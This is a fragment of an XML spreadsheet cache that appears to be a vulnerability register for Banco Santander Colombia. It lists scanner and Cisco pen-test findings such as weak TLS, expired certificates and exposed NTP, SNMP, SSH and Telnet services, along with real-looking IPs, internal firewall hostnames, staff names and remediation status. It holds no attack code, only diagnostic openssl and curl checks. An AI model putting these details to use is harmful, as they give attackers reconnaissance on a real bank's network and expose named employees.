    <m/>
    <s v="170.169.33.93"/>
    <s v="www.santander.com.co"/>
    <m/>
    <m/>
    <d v="2019-05-24T00:00:00"/>
    <n v="2587"/>
    <d v="2019-09-21T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <d v="2020-03-18T00:00:00"/>
    <s v="Durante las pruebas realizadas, se ha comprobado que la página de error &quot;404 not found&quot; por defecto de Tomcat muestra información interna acerca de la aplicación utilizada."/>
    <s v="Se recomienda modificar la página por defecto &quot;404 not found&quot; para evitar que la aplicación devuelva al usuario información relativa a la naturaleza y versión de la misma."/>
    <s v="Se ha detectado que la aplicación devuelve información acerca de la versión y aplicación utilizadas. Esta información podría ser utilizada por un atacante con el objetivo de recabar información para ataques futuros."/>
    <m/>
    <s v="Certificada"/>
    <s v="Jaime Orlando Vargas Martinez"/>
  </r>
  <r>
    <n v="25"/>
    <s v="BSNC"/>
    <s v="Deloitte"/>
    <s v="Wep App"/>
    <s v="BSNC-2020-003"/>
    <m/>
    <s v="Portal Web"/>
    <s v="MAN-18af232d"/>
    <s v="CO-19-AUTO-02-CO-010"/>
    <x v="22"/>
    <m/>
    <s v="Solved"/>
    <x v="2"/>
    <n v="3.0999999046325684"/>
    <m/>
    <s v="170.169.33.93"/>
    <s v="www.santander.com.co"/>
    <n v="443"/>
    <m/>
    <d v="2019-09-11T00:00:00"/>
    <n v="2477"/>
    <d v="2020-01-09T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <d v="2020-03-31T00:00:00"/>
    <s v="Las url afectadas son: _x000a_/js/bootstrap-paginator.js _x000a_/js/cookiesUtils.js _x000a_/recursos/imagenes/home_142.jpg _x000a_ /recursos/imagenes/home_63.jpg"/>
    <s v="Se recomienda configurar el servidor remoto para que en las cabeceras de respuesta se incluya la cabecera HSTS incluyendo un período de validez estimado de la política en el propio navegador."/>
    <s v="La política HSTS o HTTP Strict Transport Security es un mecanismo soportado por los principales servidores web –Apache, NGNIX- y la mayoría de navegadores, que reduce las posibilidades de que un atacante pueda interceptar nuestras comunicaciones y recopilar cookies y datos similares intercambiados durante la sesión. El estándar permite que el servidor y el navegador web interactúen de manera más fiable, empleando protocolos de transporte cifrados como TSL/SSL. Así, es capaz de acabar con variados ataques de red y también con algunos errores cometidos por los desarrolladores de los distintos sites (por ejemplo, el uso de conexiones no seguras para descargar recursos de la web). De esta manera y al margen de determinar cómo deben actuar el navegador y el servidor, HSTS incorpora una cabecera HSTS (Strict-Transport-Security), que fuerza a utilizar un canal cifrado, HTTPS, para la comunicación entre el navegador del usuario y el servidor. A partir del momento en el que el navegador recibe una cabecera HSTS en las cabeceras de respuesta del servidor, todas las peticiones a este dominio y subdominios serán realizadas mediante HTTPS. Asimismo, las cabeceras HSTS, quedarán almacenadas en el navegador (en forma de lista), algo que se aplicará durante un tiempo determinado que se establece en la propia cabecera de respuesta."/>
    <m/>
    <s v="Certificada"/>
    <s v="Jaime Orlando Vargas Martinez"/>
  </r>
  <r>
    <n v="26"/>
    <s v="BSNC"/>
    <s v="Qualys"/>
    <s v="Wep App"/>
    <s v="BSNC-2020-004"/>
    <m/>
    <s v="Web de Proveedores"/>
    <s v="QA-1701663040"/>
    <m/>
    <x v="23"/>
    <m/>
    <s v="Dismissed"/>
    <x v="1"/>
    <s v="Vendor"/>
    <m/>
    <s v="170.169.33.48"/>
    <s v="confirming.santander.com.co"/>
    <n v="443"/>
    <s v="TCP"/>
    <d v="2019-12-17T00:00:00"/>
    <n v="2380"/>
    <d v="2020-03-16T00:00:00"/>
    <x v="0"/>
    <s v="Waiver"/>
    <s v="1ª Fecha:_x000a_2ª Fecha:"/>
    <s v="1ª Fecha:_x000a_2ª Fecha:"/>
    <d v="2020-07-13T00:00:00"/>
    <m/>
    <s v="Deshabilite el uso del protocolo TLSv1.0 a favor de un protocolo criptográficamente más fuerte como TLSv1.2._x000a_Los siguientes comandos de openssl se pueden usar para hacer una prueba manual:_x000a_openssl s_client -connect ip: puerto -tls1_x000a__x000a_Si la prueba es exitosa, entonces el objetivo"/>
    <s v="Un atacante puede explotar defectos criptográficos para realizar ataques de tipo intermediario o para descifrar comunicaciones. &lt;P&gt;_x000a_Por ejemplo: un atacante podría forzar una degradación del protocolo TLS al antiguo protocolo SSLv3.0 y explotar el POODLE vulnerabi"/>
    <d v="2020-06-30T00:00:00"/>
    <s v="Fue dado de baja el Lunes 13 de Julio del 2020"/>
    <m/>
  </r>
  <r>
    <n v="27"/>
    <s v="BSNC"/>
    <s v="Qualys"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="Confirming &amp; Factoring\Bot"/>
    <s v="QA-94188246370"/>
    <m/>
    <x v="24"/>
    <m/>
    <s v="Dismissed"/>
    <x v="1"/>
    <s v="Vendor"/>
    <m/>
    <n v="94188208248"/>
    <s v="confirming-factoring.santander.com.co"/>
    <n v="443"/>
    <s v="TCP"/>
    <d v="2019-12-17T00:00:00"/>
    <n v="2380"/>
    <d v="2020-03-16T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <m/>
    <s v="Vulnerabilidad presente, debido a que el certificado presente por IP no coincide con el del FQDN (confirming-factoring.santander.com.co), por este motivo se confirma la vulnerabilidad, que conllevaría a la posible situación de cifrado sin autenticación"/>
    <s v="_x000a_Instale un certificado de servidor cuyo Asunto commonName o subjectAltName coincida con el FQDN del servidor."/>
    <s v="Un atacante man-in-the-middle puede explotar esta vulnerabilidad junto con un ataque de envenenamiento de caché DNS para atraer al cliente a otro servidor y luego robar toda la comunicación de cifrado."/>
    <m/>
    <s v="Corresponde a un Falso Positivo"/>
    <s v="Jaime Orlando Vargas Martinez"/>
  </r>
  <r>
    <n v="28"/>
    <s v="BSNC"/>
    <s v="Qualys"/>
    <s v="Wep App"/>
    <m/>
    <m/>
    <s v="Confirming &amp; Factoring\Bot"/>
    <s v="QA-94188219979"/>
    <m/>
    <x v="25"/>
    <m/>
    <s v="Solved"/>
    <x v="1"/>
    <s v="Vendor"/>
    <m/>
    <n v="94188208248"/>
    <s v="confirming-factoring.santander.com.co"/>
    <n v="443"/>
    <s v="TCP"/>
    <d v="2019-12-17T00:00:00"/>
    <n v="2380"/>
    <d v="2020-03-16T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <d v="2020-04-13T00:00:00"/>
    <m/>
    <s v="_x000a_&lt;B&gt; Nota: &lt;/B&gt; Para depurar mejor los resultados de este QID, se solicita que los clientes ejecuten comandos para simular la siguiente funcionalidad: curl -lkL --verbose. &lt;P&gt;_x000a_CWE-693: Falla del mecanismo de protección menciona lo siguiente: el producto no"/>
    <s v="_x000a_Dependiendo de la vulnerabilidad que se explota, un atacante remoto no autenticado podría realizar scripts de sitios, clickjacking o ataques de detección de tipo MIME."/>
    <m/>
    <s v="Certificada"/>
    <s v="Jaime Orlando Vargas Martinez"/>
  </r>
  <r>
    <n v="29"/>
    <s v="BSNC"/>
    <s v="Task Force"/>
    <s v="Telecomunicaciones"/>
    <m/>
    <m/>
    <s v="Internet invitados Backup Santander (Wifi Backup)"/>
    <m/>
    <m/>
    <x v="26"/>
    <s v="CWE-296: Improper Following of Chain of Trust for Certificate Validation"/>
    <s v="Solved"/>
    <x v="1"/>
    <m/>
    <m/>
    <s v="181.48.20.105"/>
    <m/>
    <n v="443"/>
    <s v="TCP"/>
    <d v="2019-12-13T00:00:00"/>
    <n v="2384"/>
    <d v="2020-03-12T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <d v="2020-05-18T00:00:00"/>
    <s v="The following certificate was part of the certificate chain sent by the remote host, but it has expired : Subject : 2.5.4.41=AR161-Self-Signed-Certificate-21500102122SHB600935 Not After : Apr 02 00:00:00 2010 GMT The following certificate was at the top of the certificate chain sent by the remote host, but it is signed by an unknown certificate authority : Subject : 2.5.4.41=AR161-Self-Signed-Certificate-21500102122SHB600935 Issuer : 2.5.4.41=AR161-Self-Signed-Certificate-21500102122SHB600935"/>
    <s v="Cisco recommends that SSL services always use certificates signed by an authority that clients belonging to normal system users will trust._x000a_The vendor for each supported client will be able to provide an up-to-date list of certificate authorities who are trusted by default. One of these will be required to sign the certificate for each affected service."/>
    <m/>
    <m/>
    <s v="Certificada"/>
    <m/>
  </r>
  <r>
    <n v="30"/>
    <s v="BSNC"/>
    <s v="Task Force"/>
    <s v="Telecomunicaciones"/>
    <m/>
    <m/>
    <s v="Internet invitados Backup Santander (Wifi Backup)"/>
    <m/>
    <m/>
    <x v="26"/>
    <s v="CWE-296: Improper Following of Chain of Trust for Certificate Validation"/>
    <s v="Solved"/>
    <x v="1"/>
    <m/>
    <m/>
    <s v="181.48.20.104"/>
    <m/>
    <n v="443"/>
    <s v="TCP"/>
    <d v="2019-12-13T00:00:00"/>
    <n v="2384"/>
    <d v="2020-03-12T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <d v="2020-05-18T00:00:00"/>
    <s v="The following certificate was part of the certificate chain sent by the remote host, but it has expired : Subject : 2.5.4.41=AR161-Self-Signed-Certificate-_x000a_186021MISC : Banco Santander (PID 894366) IR Complementary Pen Test 25_x000a_CISCO RESTRICTED_x000a_21500102122SHB600935 Not After : Apr 02 00:00:00 2010 GMT The following certificate was at the top of the certificate chain sent by the remote host, but it is signed by an unknown certificate authority : Subject : 2.5.4.41=AR161-Self-Signed-Certificate-21500102122SHB600935 Issuer : 2.5.4.41=AR161-Self-Signed-Certificate-21500102122SHB600935"/>
    <s v="Cisco recommends that SSL services always use certificates signed by an authority that clients belonging to normal system users will trust._x000a_The vendor for each supported client will be able to provide an up-to-date list of certificate authorities who are trusted by default. One of these will be required to sign the certificate for each affected service."/>
    <m/>
    <m/>
    <s v="Certificada"/>
    <m/>
  </r>
  <r>
    <n v="31"/>
    <s v="BSNC"/>
    <s v="Task Force"/>
    <s v="Telecomunicaciones"/>
    <m/>
    <m/>
    <s v="fw.santander.com.co/Peer del Firewall"/>
    <m/>
    <m/>
    <x v="26"/>
    <s v="CWE-296: Improper Following of Chain of Trust for Certificate Validation"/>
    <s v="Solved"/>
    <x v="1"/>
    <m/>
    <m/>
    <s v="170.169.127.22"/>
    <m/>
    <n v="443"/>
    <s v="TCP"/>
    <d v="2019-12-13T00:00:00"/>
    <n v="2384"/>
    <d v="2020-03-12T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <d v="2020-05-18T00:00:00"/>
    <s v="The following certificate was at the top of the certificate chain sent by the remote host, but it is signed by an unknown certificate authority : Subject : O=InternetNala..fgvprc Issuer : O=InternetNala..fgvprc"/>
    <s v="Cisco recommends that SSL services always use certificates signed by an authority that clients belonging to normal system users will trust._x000a_The vendor for each supported client will be able to provide an up-to-date list of certificate authorities who are trusted by default. One of these will be required to sign the certificate for each affected service."/>
    <m/>
    <m/>
    <s v="Certificada"/>
    <m/>
  </r>
  <r>
    <n v="32"/>
    <s v="BSNC"/>
    <s v="Task Force"/>
    <s v="Telecomunicaciones"/>
    <m/>
    <m/>
    <s v="Internet Backup Santander (Cableada"/>
    <m/>
    <m/>
    <x v="27"/>
    <s v="CWE-406: Insufficient Control of Network Message Volume (Network Amplification)"/>
    <s v="Dismissed"/>
    <x v="1"/>
    <m/>
    <m/>
    <n v="190216136242"/>
    <m/>
    <n v="123"/>
    <s v="UDP"/>
    <d v="2019-12-13T00:00:00"/>
    <n v="2384"/>
    <d v="2020-03-12T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <m/>
    <s v="Cisco elicited the following response from the remote host by sending an NTP mode 6 query : 'version=&quot;4&quot;, processor=&quot;unknown&quot;, system=&quot;UNIX&quot;, leap=3, stratum=16, precision=-21, rootdelay=, rootdisp=, refid=INIT, reftime=0x00000000.00000000, clock=0xE0C57C60.745BE732, peer=0, tc=3, mintc=3, offset=, frequency=, sys_jitter=, clk_jitter=, clk_wander='"/>
    <s v="Cisco recommends disabling the NTP server, or if the NTP server is required, Cisco recommends that ACLs are set in order to only allow the access to this service to the IP addresses that use this service._x000a_In case of Cisco IOS devices, it is not allowed to disable Mode 6 queries."/>
    <m/>
    <m/>
    <s v="En proceso de certificacion._x000a_No fue certificada_x000a_Susana Tovar: La red ya no existen_x000a_Javier Leon: dado que el servicio se canceló y  que son segmentos públicos el proveedor de servicio reasigno el direccionamiento a otro cliente."/>
    <m/>
  </r>
  <r>
    <n v="33"/>
    <s v="BSNC"/>
    <s v="Task Force"/>
    <s v="Telecomunicaciones"/>
    <m/>
    <m/>
    <s v="Internet Backup Santander (Cableada"/>
    <m/>
    <m/>
    <x v="27"/>
    <s v="CWE-406: Insufficient Control of Network Message Volume (Network Amplification)"/>
    <s v="Dismissed"/>
    <x v="1"/>
    <m/>
    <m/>
    <n v="190216136241"/>
    <m/>
    <n v="123"/>
    <s v="UDP"/>
    <d v="2019-12-13T00:00:00"/>
    <n v="2384"/>
    <d v="2020-03-12T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <m/>
    <s v="Cisco elicited the following response from the remote host by sending an NTP mode 6 query : 'version=&quot;4&quot;, processor=&quot;unknown&quot;, system=&quot;UNIX&quot;, leap=3, stratum=16, precision=-21, rootdelay=, rootdisp=, refid=INIT, reftime=0x00000000.00000000, clock=0xE0C5B1FC.6E124E27, peer=0, tc=3, mintc=3, offset=, frequency=, sys_jitter=, clk_jitter=,clk_wander='"/>
    <s v="Cisco recommends disabling the NTP server, or if the NTP server is required, Cisco recommends that ACLs are set in order to only allow the access to this service to the IP addresses that use this service._x000a_In case of Cisco IOS devices, it is not allowed to disable Mode 6 queries."/>
    <m/>
    <m/>
    <s v="En proceso de certificacion._x000a_No fue certificada_x000a_Susana Tovar: La red ya no existen_x000a_Javier Leon: dado que el servicio se canceló y  que son segmentos públicos el proveedor de servicio reasigno el direccionamiento a otro cliente."/>
    <m/>
  </r>
  <r>
    <n v="34"/>
    <s v="BSNC"/>
    <s v="Task Force"/>
    <s v="Telecomunicaciones"/>
    <m/>
    <m/>
    <s v="Internet principal Santander (Cableada)"/>
    <m/>
    <m/>
    <x v="27"/>
    <s v="CWE-406: Insufficient Control of Network Message Volume (Network Amplification)"/>
    <s v="Solved"/>
    <x v="1"/>
    <m/>
    <m/>
    <s v="181.48.106.210"/>
    <m/>
    <n v="123"/>
    <s v="UDP"/>
    <d v="2019-12-13T00:00:00"/>
    <n v="2384"/>
    <d v="2020-03-12T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <d v="2020-08-26T00:00:00"/>
    <s v="Cisco elicited the following response from the remote host by sending an NTP mode 6 query : 'version=&quot;4&quot;, processor=&quot;unknown&quot;, system=&quot;UNIX&quot;, leap=3, stratum=16, precision=-21, rootdelay=, rootdisp=, refid=INIT, reftime=0x00000000.00000000, clock=0xE0C5B209.4748434E, peer=0, tc=3, mintc=3, offset=, frequency=, sys_jitter=, clk_jitter=, clk_wander='"/>
    <s v="Cisco recommends disabling the NTP server, or if the NTP server is required, Cisco recommends that ACLs are set in order to only allow the access to this service to the IP addresses that use this service._x000a_In case of Cisco IOS devices, it is not allowed to disable Mode 6 queries."/>
    <m/>
    <m/>
    <s v="Certificada"/>
    <m/>
  </r>
  <r>
    <n v="35"/>
    <s v="BSNC"/>
    <s v="Task Force"/>
    <s v="Telecomunicaciones"/>
    <m/>
    <m/>
    <s v="Internet principal Santander (Cableada)"/>
    <m/>
    <m/>
    <x v="28"/>
    <s v="CWE-0: Insecure Configuration"/>
    <s v="Solved"/>
    <x v="1"/>
    <m/>
    <m/>
    <s v="181.48.106.209"/>
    <m/>
    <n v="161"/>
    <s v="UD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36"/>
    <s v="BSNC"/>
    <s v="Task Force"/>
    <s v="Telecomunicaciones"/>
    <m/>
    <m/>
    <s v="Internet principal Santander (Cableada)"/>
    <m/>
    <m/>
    <x v="28"/>
    <s v="CWE-0: Insecure Configuration"/>
    <s v="Solved"/>
    <x v="1"/>
    <m/>
    <m/>
    <s v="181.48.106.210"/>
    <m/>
    <n v="123"/>
    <s v="UDP"/>
    <d v="2019-12-13T00:00:00"/>
    <n v="2384"/>
    <d v="2020-03-12T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <d v="2020-08-26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37"/>
    <s v="BSNC"/>
    <s v="Task Force"/>
    <s v="Telecomunicaciones"/>
    <m/>
    <m/>
    <s v="Internet invitados Backup Santander (Wifi Backup)"/>
    <m/>
    <m/>
    <x v="28"/>
    <s v="CWE-0: Insecure Configuration"/>
    <s v="Solved"/>
    <x v="1"/>
    <m/>
    <m/>
    <s v="181.48.20.111"/>
    <m/>
    <n v="123"/>
    <s v="UD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38"/>
    <s v="BSNC"/>
    <s v="Task Force"/>
    <s v="Telecomunicaciones"/>
    <m/>
    <m/>
    <s v="Internet invitados principal Santander (Wifi Ppal)"/>
    <m/>
    <m/>
    <x v="28"/>
    <s v="CWE-0: Insecure Configuration"/>
    <s v="Solved"/>
    <x v="1"/>
    <m/>
    <m/>
    <s v="181.49.176.1"/>
    <m/>
    <n v="123"/>
    <s v="UD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39"/>
    <s v="BSNC"/>
    <s v="Task Force"/>
    <s v="Telecomunicaciones"/>
    <m/>
    <m/>
    <s v="Internet invitados Backup Santander (Wifi Backup)"/>
    <m/>
    <m/>
    <x v="28"/>
    <s v="CWE-0: Insecure Configuration"/>
    <s v="Solved"/>
    <x v="1"/>
    <m/>
    <m/>
    <s v="181.48.20.104"/>
    <m/>
    <n v="23"/>
    <s v="TC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40"/>
    <s v="BSNC"/>
    <s v="Task Force"/>
    <s v="Telecomunicaciones"/>
    <m/>
    <m/>
    <s v="Internet invitados principal Santander (Wifi Ppal)"/>
    <m/>
    <m/>
    <x v="28"/>
    <s v="CWE-0: Insecure Configuration"/>
    <s v="Solved"/>
    <x v="1"/>
    <m/>
    <m/>
    <s v="181.49.176.1"/>
    <m/>
    <n v="161"/>
    <s v="UD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41"/>
    <s v="BSNC"/>
    <s v="Task Force"/>
    <s v="Telecomunicaciones"/>
    <m/>
    <m/>
    <s v="Internet invitados Backup Santander (Wifi Backup)"/>
    <m/>
    <m/>
    <x v="28"/>
    <s v="CWE-0: Insecure Configuration"/>
    <s v="Solved"/>
    <x v="1"/>
    <m/>
    <m/>
    <s v="181.48.20.104"/>
    <m/>
    <n v="22"/>
    <s v="TC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42"/>
    <s v="BSNC"/>
    <s v="Task Force"/>
    <s v="Telecomunicaciones"/>
    <m/>
    <m/>
    <s v="Internet principal Santander (Cableada)"/>
    <m/>
    <m/>
    <x v="28"/>
    <s v="CWE-0: Insecure Configuration"/>
    <s v="Solved"/>
    <x v="1"/>
    <m/>
    <m/>
    <s v="181.48.106.209"/>
    <m/>
    <n v="123"/>
    <s v="UD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43"/>
    <s v="BSNC"/>
    <s v="Task Force"/>
    <s v="Telecomunicaciones"/>
    <m/>
    <m/>
    <s v="Internet principal Santander (Cableada)"/>
    <m/>
    <m/>
    <x v="28"/>
    <s v="CWE-0: Insecure Configuration"/>
    <s v="Solved"/>
    <x v="1"/>
    <m/>
    <m/>
    <s v="181.48.106.210"/>
    <m/>
    <n v="161"/>
    <s v="UDP"/>
    <d v="2019-12-13T00:00:00"/>
    <n v="2384"/>
    <d v="2020-03-12T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <d v="2020-08-26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44"/>
    <s v="BSNC"/>
    <s v="Task Force"/>
    <s v="Telecomunicaciones"/>
    <m/>
    <m/>
    <s v="Internet invitados Backup Santander (Wifi Backup)"/>
    <m/>
    <m/>
    <x v="28"/>
    <s v="CWE-0: Insecure Configuration"/>
    <s v="Solved"/>
    <x v="1"/>
    <m/>
    <m/>
    <s v="181.48.20.105"/>
    <m/>
    <n v="22"/>
    <s v="TC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45"/>
    <s v="BSNC"/>
    <s v="Task Force"/>
    <s v="Telecomunicaciones"/>
    <m/>
    <m/>
    <s v="Internet Backup Santander (Cableada"/>
    <m/>
    <m/>
    <x v="28"/>
    <s v="CWE-0: Insecure Configuration"/>
    <s v="Dismissed"/>
    <x v="1"/>
    <m/>
    <m/>
    <n v="190216136241"/>
    <m/>
    <n v="123"/>
    <s v="UDP"/>
    <d v="2019-12-13T00:00:00"/>
    <n v="2384"/>
    <d v="2020-03-12T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <m/>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En proceso de certificacion._x000a_No fue certificada_x000a_Susana Tovar: La red ya no existen_x000a_Javier Leon: dado que el servicio se canceló y  que son segmentos públicos el proveedor de servicio reasigno el direccionamiento a otro cliente."/>
    <m/>
  </r>
  <r>
    <n v="46"/>
    <s v="BSNC"/>
    <s v="Task Force"/>
    <s v="Telecomunicaciones"/>
    <m/>
    <m/>
    <s v="Internet invitados Backup Santander (Wifi Backup)"/>
    <m/>
    <m/>
    <x v="28"/>
    <s v="CWE-0: Insecure Configuration"/>
    <s v="Solved"/>
    <x v="1"/>
    <m/>
    <m/>
    <s v="181.48.20.105"/>
    <m/>
    <n v="123"/>
    <s v="UD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47"/>
    <s v="BSNC"/>
    <s v="Task Force"/>
    <s v="Telecomunicaciones"/>
    <m/>
    <m/>
    <s v="Internet Backup Santander (Cableada"/>
    <m/>
    <m/>
    <x v="28"/>
    <s v="CWE-0: Insecure Configuration"/>
    <s v="Dismissed"/>
    <x v="1"/>
    <m/>
    <m/>
    <n v="190216136242"/>
    <m/>
    <n v="161"/>
    <s v="UDP"/>
    <d v="2019-12-13T00:00:00"/>
    <n v="2384"/>
    <d v="2020-03-12T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <m/>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En proceso de certificacion._x000a_No fue certificada_x000a_Susana Tovar: La red ya no existen_x000a_Javier Leon: dado que el servicio se canceló y  que son segmentos públicos el proveedor de servicio reasigno el direccionamiento a otro cliente."/>
    <m/>
  </r>
  <r>
    <n v="48"/>
    <s v="BSNC"/>
    <s v="Task Force"/>
    <s v="Telecomunicaciones"/>
    <m/>
    <m/>
    <s v="Internet invitados principal Santander (Wifi Ppal)"/>
    <m/>
    <m/>
    <x v="28"/>
    <s v="CWE-0: Insecure Configuration"/>
    <s v="Solved"/>
    <x v="1"/>
    <m/>
    <m/>
    <s v="181.49.176.0"/>
    <m/>
    <n v="161"/>
    <s v="UD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49"/>
    <s v="BSNC"/>
    <s v="Task Force"/>
    <s v="Telecomunicaciones"/>
    <m/>
    <m/>
    <s v="Internet invitados Backup Santander (Wifi Backup)"/>
    <m/>
    <m/>
    <x v="28"/>
    <s v="CWE-0: Insecure Configuration"/>
    <s v="Solved"/>
    <x v="1"/>
    <m/>
    <m/>
    <s v="181.48.20.105"/>
    <m/>
    <n v="23"/>
    <s v="TC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50"/>
    <s v="BSNC"/>
    <s v="Task Force"/>
    <s v="Telecomunicaciones"/>
    <m/>
    <m/>
    <s v="Internet Backup Santander (Cableada"/>
    <m/>
    <m/>
    <x v="28"/>
    <s v="CWE-0: Insecure Configuration"/>
    <s v="Dismissed"/>
    <x v="1"/>
    <m/>
    <m/>
    <n v="190216136242"/>
    <m/>
    <n v="123"/>
    <s v="UDP"/>
    <d v="2019-12-13T00:00:00"/>
    <n v="2384"/>
    <d v="2020-03-12T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <m/>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En proceso de certificacion._x000a_No fue certificada_x000a_Susana Tovar: La red ya no existen_x000a_Javier Leon: dado que el servicio se canceló y  que son segmentos públicos el proveedor de servicio reasigno el direccionamiento a otro cliente."/>
    <m/>
  </r>
  <r>
    <n v="51"/>
    <s v="BSNC"/>
    <s v="Task Force"/>
    <s v="Telecomunicaciones"/>
    <m/>
    <m/>
    <s v="Internet Backup Santander (Cableada"/>
    <m/>
    <m/>
    <x v="28"/>
    <s v="CWE-0: Insecure Configuration"/>
    <s v="Dismissed"/>
    <x v="1"/>
    <m/>
    <m/>
    <n v="190216136241"/>
    <m/>
    <n v="161"/>
    <s v="UDP"/>
    <d v="2019-12-13T00:00:00"/>
    <n v="2384"/>
    <d v="2020-03-12T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <m/>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En proceso de certificacion._x000a_No fue certificada_x000a_Susana Tovar: La red ya no existen_x000a_Javier Leon: dado que el servicio se canceló y  que son segmentos públicos el proveedor de servicio reasigno el direccionamiento a otro cliente."/>
    <m/>
  </r>
  <r>
    <n v="52"/>
    <s v="BSNC"/>
    <s v="Task Force"/>
    <s v="Telecomunicaciones"/>
    <m/>
    <m/>
    <s v="Internet invitados principal Santander (Wifi Ppal)"/>
    <m/>
    <m/>
    <x v="28"/>
    <s v="CWE-0: Insecure Configuration"/>
    <s v="Solved"/>
    <x v="1"/>
    <m/>
    <m/>
    <s v="181.49.176.7"/>
    <m/>
    <n v="161"/>
    <s v="UDP"/>
    <d v="2019-12-13T00:00:00"/>
    <n v="2384"/>
    <d v="2020-03-12T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <d v="2020-05-18T00:00:00"/>
    <s v="The Team identified the presence of services not usually required for normal operations. For instance, NTP and SNMP services were observed exposed to the Internet._x000a_The Team also identified SSH and Telnet services exposed; however, the connection to these services is terminated from the server before reaching the login prompt."/>
    <s v="Cisco recommends that any services not strictly necessary for normal operations are either disabled or removed completely."/>
    <m/>
    <m/>
    <s v="Certificada"/>
    <m/>
  </r>
  <r>
    <n v="53"/>
    <s v="BSNC"/>
    <s v="Task Force"/>
    <s v="Telecomunicaciones"/>
    <m/>
    <m/>
    <s v="Internet invitados Backup Santander (Wifi Backup)"/>
    <m/>
    <m/>
    <x v="29"/>
    <s v="CWE-298: Improper Validation of Certificate - Expiration"/>
    <s v="Solved"/>
    <x v="1"/>
    <m/>
    <m/>
    <s v="181.48.20.104"/>
    <m/>
    <n v="443"/>
    <s v="TCP"/>
    <d v="2019-12-13T00:00:00"/>
    <n v="2384"/>
    <d v="2020-03-12T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <d v="2020-05-18T00:00:00"/>
    <s v="The SSL certificate has already expired : _x000a_Subject : n/a _x000a_Issuer : n/a _x000a_Not valid before : Apr 2 00:00:00 2000 GMT _x000a_Not valid after : Apr 2 00:00:00 2010 GMT"/>
    <s v="Cisco recommends that any expired SSL Certificate is renewed as soon as possible if SSL continues to be required."/>
    <m/>
    <m/>
    <s v="Certificada"/>
    <m/>
  </r>
  <r>
    <n v="54"/>
    <s v="BSNC"/>
    <s v="Task Force"/>
    <s v="Telecomunicaciones"/>
    <m/>
    <m/>
    <s v="Internet invitados principal Santander (Wifi Ppal)"/>
    <m/>
    <m/>
    <x v="30"/>
    <s v="CWE-201: Information Exposure Through Sent Data"/>
    <s v="Solved"/>
    <x v="1"/>
    <m/>
    <m/>
    <s v="181.49.176.4"/>
    <m/>
    <n v="264"/>
    <s v="TCP"/>
    <d v="2019-12-13T00:00:00"/>
    <n v="2384"/>
    <d v="2020-03-12T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <d v="2020-05-18T00:00:00"/>
    <s v="Firewall host : FWCOLBSNC1 _x000a_SmartCenter host : InternetNala"/>
    <s v="Cisco recommends that access to this service is limited to only those IP addresses specifically requiring it."/>
    <m/>
    <m/>
    <s v="Certificada"/>
    <m/>
  </r>
  <r>
    <n v="55"/>
    <s v="BSNC"/>
    <s v="Task Force"/>
    <s v="Telecomunicaciones"/>
    <m/>
    <m/>
    <s v="fw.santander.com.co/Peer del Firewall"/>
    <m/>
    <m/>
    <x v="30"/>
    <s v="CWE-201: Information Exposure Through Sent Data"/>
    <s v="Solved"/>
    <x v="1"/>
    <m/>
    <m/>
    <s v="170.169.127.22"/>
    <m/>
    <n v="264"/>
    <s v="TCP"/>
    <d v="2019-12-13T00:00:00"/>
    <n v="2384"/>
    <d v="2020-03-12T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <d v="2020-08-26T00:00:00"/>
    <s v="Firewall host : FWCORE02_VPN_Nala _x000a_SmartCenter host : InternetNala"/>
    <s v="Cisco recommends that access to this service is limited to only those IP addresses specifically requiring it."/>
    <m/>
    <m/>
    <s v="Certificada"/>
    <m/>
  </r>
  <r>
    <n v="56"/>
    <s v="BSNC"/>
    <s v="Task Force"/>
    <s v="Telecomunicaciones"/>
    <m/>
    <m/>
    <s v="Internet invitados principal Santander (Wifi Ppal)"/>
    <m/>
    <m/>
    <x v="30"/>
    <s v="CWE-201: Information Exposure Through Sent Data"/>
    <s v="Solved"/>
    <x v="1"/>
    <m/>
    <m/>
    <s v="181.49.176.5"/>
    <m/>
    <n v="264"/>
    <s v="TCP"/>
    <d v="2019-12-13T00:00:00"/>
    <n v="2384"/>
    <d v="2020-03-12T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <d v="2020-05-18T00:00:00"/>
    <s v="Firewall host : FWCOLBSNC2 _x000a_SmartCenter host : InternetNala"/>
    <s v="Cisco recommends that access to this service is limited to only those IP addresses specifically requiring it."/>
    <m/>
    <m/>
    <s v="Certificada"/>
    <m/>
  </r>
  <r>
    <n v="57"/>
    <s v="BSNC"/>
    <s v="Task Force"/>
    <s v="Telecomunicaciones"/>
    <m/>
    <m/>
    <s v="Internet Backup Santander (Cableada"/>
    <m/>
    <m/>
    <x v="31"/>
    <s v="CWE-0: Missing Security Patches"/>
    <s v="Dismissed"/>
    <x v="1"/>
    <m/>
    <m/>
    <n v="190216136241"/>
    <m/>
    <n v="500"/>
    <s v="UDP"/>
    <d v="2019-12-13T00:00:00"/>
    <n v="2384"/>
    <d v="2020-03-12T00:00:00"/>
    <x v="0"/>
    <m/>
    <m/>
    <m/>
    <m/>
    <s v="Cisco was able to get the following IKE vendor ID(s) : _x000a_CISCO-DELETE-REASON _x000a_FLEXVPN-SUPPORTED"/>
